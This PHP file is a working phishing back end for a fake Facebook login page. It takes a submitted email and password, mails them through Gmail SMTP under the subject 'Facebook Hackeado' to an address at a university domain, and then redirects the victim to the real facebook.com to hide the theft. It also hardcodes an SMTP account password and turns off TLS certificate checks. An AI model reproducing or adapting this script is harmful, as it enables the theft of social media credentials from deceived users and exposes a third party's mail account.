<?php
error_reporting(E_ALL ^ E_DEPRECATED);
header('Content-Type: text/html; Charset=UTF-8');
$email = isset($_POST['email']) ? $_POST['email'] : '';
$pass = isset($_POST['pass']) ? $_POST['pass'] : '';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'phpMailer/Exception.php';
require 'phpMailer/PHPMailer.php';
require 'phpMailer/SMTP.php';

$mail = new PHPMailer(true);

$mail->CharSet = 'UTF-8';
$mail->isSMTP();
$mail->Host = 'smtp.gmail.com';
$mail->SMTPAuth = true;
$mail->Username = 'altausuario10@utfv.edu.mx';
$mail->Password = '@123Alta2022';
$mail->SMTPSecure = 'ssl';
$mail->Port = 465;

$mail->SMTPOptions = array( 'ssl' => array( 'verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true ) );

$mail->setFrom('20307028@utfv.edu.mx');
$mail->addAddress('20307028@utfv.edu.mx');

$mail->isHTML(true);
$mail->Subject = 'Facebook Hackeado';
$mail->Body = '
<p><b>Correo: </b> '.$email.'</p>
<p><b>Password: </b> '.$pass.'</p>
<br>
';

$mail->send();

echo'<script>window.location="https://www.facebook.com"</script>';



?>